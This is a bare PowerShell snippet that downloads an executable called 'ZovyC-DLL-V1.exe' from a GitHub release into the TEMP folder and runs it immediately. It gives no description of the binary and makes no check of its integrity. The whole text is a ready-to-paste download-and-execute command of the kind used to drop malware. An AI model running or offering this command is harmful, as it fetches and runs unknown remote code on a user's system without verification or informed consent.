$file = "$env:TEMP\ZovyC-DLL-V1.exe"

iwr "https://github.com/joker55za66-ops/ZovyC-DLL-V1/releases/download/v1/ZovyC-DLL-V1.exe" -OutFile $file

Start-Process $file
